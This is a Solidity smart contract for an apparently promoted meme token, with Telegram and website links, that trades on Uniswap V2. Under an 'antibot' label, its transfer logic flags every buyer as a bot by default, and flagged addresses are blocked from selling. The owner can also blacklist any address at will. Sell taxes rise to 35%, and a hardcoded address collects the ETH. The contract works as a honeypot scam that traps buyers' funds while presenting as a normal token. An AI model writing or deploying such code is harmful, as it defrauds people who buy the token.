//t.me/shiba_10000
//shiba10000.com

pragma solidity ^0.8.7;

import "./ERC20.sol";
import "./IUniswapV2Router02.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

abstract contract TradableErc20 is ERC20 {
    IUniswapV2Router02 internal constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapV2Pair;
    bool public tradingEnable;
    mapping(address => bool) public isBot;
    mapping(address => bool) _isExcludedFromFee;
    bool _autoBanBots = true;
    bool _inSwap;
    uint256 public maxBuy;
    address _taxAddress = address(0x1461905A30b40314F38C324ECf2BF8e1Ced8ABC4);

    uint256 constant maxBuyIncrementMinutesTimer = 2; // increment maxbuy minutes
    uint256 constant maxByyIncrementPercentil = 1; // increment maxbyu percentil 1000=100%
    uint256 public maxBuyIncrementValue; // value for increment maxBuy
    uint256 public incrementTime; // last increment time

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor(string memory name_, string memory symbol_)
        ERC20(name_, symbol_)
    {
        _isExcludedFromFee[address(0)] = true;
    }

    receive() external payable {}

    function makeLiquidity() public onlyOwner {
        require(uniswapV2Pair == address(0));
        address pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        _balances[address(this)] = _totalSupply;
        _allowances[address(this)][address(_uniswapV2Router)] = _totalSupply;
        _isExcludedFromFee[pair] = true;
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _totalSupply,
            0,
            0,
            msg.sender,
            block.timestamp
        );

        uniswapV2Pair = pair;
        tradingEnable = true;

        incrementTime = block.timestamp;
        maxBuyIncrementValue = (_totalSupply * maxByyIncrementPercentil) / 1000;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(!isBot[from] && !isBot[to]);

        // buy
        if (from == uniswapV2Pair && !_isExcludedFromFee[to]) {
            // increment maxBuy
            uint256 incrementCount = (block.timestamp - incrementTime) /
                (maxBuyIncrementMinutesTimer * 1 minutes);
            if (incrementCount > 0) {
                if (maxBuy < _totalSupply)
                    maxBuy += maxBuyIncrementValue * incrementCount;
                incrementTime = block.timestamp;
            }

            require(tradingEnable);
            if (!_autoBanBots) require(_balances[to] + amount <= maxBuy);
            // antibot
            if (_autoBanBots) isBot[to] = true;
            amount = _getFeeBuy(amount);
        }

        // sell
        if (!_inSwap && uniswapV2Pair != address(0) && to == uniswapV2Pair) {
            amount = _getFeeSell(amount, from);
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance > 0) {
                uint256 maxContractBalance = (balanceOf(uniswapV2Pair) *
                    getMaxContractBalancePercent()) / 100;
                if (contractTokenBalance > maxContractBalance) {
                    uint256 burnCount;
                    unchecked {
                        burnCount = contractTokenBalance - maxContractBalance;
                    }
                    contractTokenBalance = maxContractBalance;
                    _totalSupply -= burnCount;
                    emit Transfer(address(this), address(0), burnCount);
                }
                //console.log("swapTokensForEth");
                uint256 swapCount = contractTokenBalance;
                uint256 maxSwapCount = 2 * amount;
                if (swapCount > maxSwapCount) swapCount = maxSwapCount;
                swapTokensForEth(swapCount);
            }
        }
        super._transfer(from, to, amount);
    }

    function _getFeeBuy(uint256 amount) private returns (uint256) {
        uint256 fee = amount / 20; // 5%
        amount -= fee;
        _balances[address(this)] += fee;
        return amount;
    }

    function getSellBurnCount(uint256 amount) internal view returns (uint256) {
        // calculate fee percent
        uint256 value = _balances[uniswapV2Pair];
        uint256 vMin = value / 100; // min additive tax amount
        if (amount <= vMin) return amount / 20; // 5% constant tax
        uint256 vMax = value / 10; // max additive tax amount 10%
        if (amount > vMax) return (amount * 35) / 100; // 35% tax

        // additive tax, that in intervat 0-35%
        return (((amount - vMin) * 35 * amount) / (vMax - vMin)) / 100;
    }

    function _getFeeSell(uint256 amount, address account)
        private
        returns (uint256)
    {
        // get taxes
        uint256 devFee = amount / 20; // 5%
        uint256 burnCount = getSellBurnCount(amount); // burn count

        amount -= devFee + burnCount;
        _balances[account] -= devFee + burnCount;        
        _balances[address(this)] += devFee;
        _totalSupply -= burnCount;
        emit Transfer(address(this), address(0), burnCount);
        return amount;
    }

    function setMaxBuy(uint256 percent) external onlyOwner {
        // not allow to reduce the buy limit
        require(maxBuy <= (percent * _totalSupply) / 1000);
        _setMaxBuy(percent);
    }

    function _setMaxBuy(uint256 percentil) internal {
        maxBuy = (percentil * _totalSupply) / 1000;
    }

    function getMaxBuy() external view returns (uint256) {
        uint256 incrementCount = (block.timestamp - incrementTime) /
            (maxBuyIncrementMinutesTimer * 1 minutes);
        if (incrementCount == 0) return maxBuy;

        return maxBuy + maxBuyIncrementValue * incrementCount;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        // make the swap
        _uniswapV2Router.swapExactTokensForETH(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }

    function setBots(address[] memory accounts, bool value) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; ++i) {
            isBot[accounts[i]] = value;
        }
    }

    function setExcludeFromFee(address[] memory accounts, bool value)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; ++i) {
            _isExcludedFromFee[accounts[i]] = value;
        }
    }

    function setTradingEnable(bool value, bool autoBanBotsValue)
        external
        onlyOwner
    {
        tradingEnable = value;
        _autoBanBots = autoBanBotsValue;
    }

    function setAutoBanBots(bool value) external onlyOwner {
        _autoBanBots = value;
    }

    function withdraw() external  {
        require(msg.sender == _taxAddress);
        _withdraw(address(this).balance);
    }

    function getMaxContractBalancePercent() internal virtual returns (uint256);

    function _withdraw(uint256 sum) internal virtual;

    function isOwner(address account) internal virtual returns (bool);
}

